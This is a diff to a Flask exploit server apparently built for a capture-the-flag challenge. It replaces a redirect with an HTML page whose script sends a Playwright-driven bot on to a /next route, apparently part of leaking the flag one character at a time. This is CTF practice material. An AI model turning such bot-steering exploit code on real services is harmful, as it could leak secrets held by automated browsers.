@@ -22,11 +22,29 @@ KNOWN_FLAG = "tkbctf{"
 
 @app.route('/start')
 def start():
-    """Botに最初に踏ませるエンドポイント。状態をリセットして攻撃開始。"""
+    """Botに最初に踏ませるエンドポイント。"""
     global KNOWN_FLAG
     KNOWN_FLAG = "tkbctf{"
     print("[*] Attack Started! Resetting flag...", file=sys.stderr)
-    return redirect('/next')
+    
+    # 【修正箇所】302リダイレクトではなく、200 OKのHTMLを返す
+    # Playwrightのgotoを即座に「完了」させて sleep(10000) に突入させるためのダミーページ
+    html = """
+    <!DOCTYPE html>
+    <html>
+    <head><title>Exploit Starting...</title></head>
+    <body>
+      <h1>Exploit Loading...</h1>
+      <script>
+        // ページ読み込み完了後、0.5秒待ってから攻撃ループ（/next）へ遷移させる
+        setTimeout(() => {
+          window.location.href = '/next';
+        }, 500);
+      </script>
+    </body>
+    </html>
+    """
+    return html
 
 @app.route('/next')
 def next_char():
